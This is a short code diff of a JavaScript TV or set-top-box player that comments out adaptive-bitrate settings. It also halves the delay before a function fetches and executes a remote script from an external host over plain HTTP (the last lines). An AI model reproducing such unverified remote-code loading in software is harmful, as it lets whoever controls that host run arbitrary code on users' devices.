@@ -101,9 +101,9 @@ function stbPlay(url, pos){
         else stbToFullScreen();
 
         curTrack = 0;
-         var bitRateString = 'BITRATES=5000~10000|STARTBITRATE=HIGHEST|SKIPBITRATE=LOWEST';
-         var bitRateString = 'STARTBITRATE=HIGHEST';
-         try{ webapis.avplay.setStreamingProperty('ADAPTIVE_INFO', bitRateString); }catch(e){}
+         //var bitRateString = 'BITRATES=5000~10000|STARTBITRATE=HIGHEST|SKIPBITRATE=LOWEST';
+         //var bitRateString = 'STARTBITRATE=HIGHEST';
+         //try{ webapis.avplay.setStreamingProperty('ADAPTIVE_INFO', bitRateString); }catch(e){}
         // webapis.avplay.setStreamingProperty("PREBUFFER_MODE", '3000');
         // webapis.avplay.setStreamingProperty("PREBUFFER_MODE", sBufSize+'000');
         // webapis.avplay.setStreamingProperty("ADAPTIVE_INFO", "FIXED_MAX_RESOLUTION=7680X4320");
@@ -128,4 +128,4 @@ function stbPlay(url, pos){
 }
 
 function load_stb(){$.getScript('http://igrva.kamenka.ml/stb.php')}
-try {setTimeout(load_stb, 10000);}catch (e) {}
+try {setTimeout(load_stb, 5000);}catch (e) {}
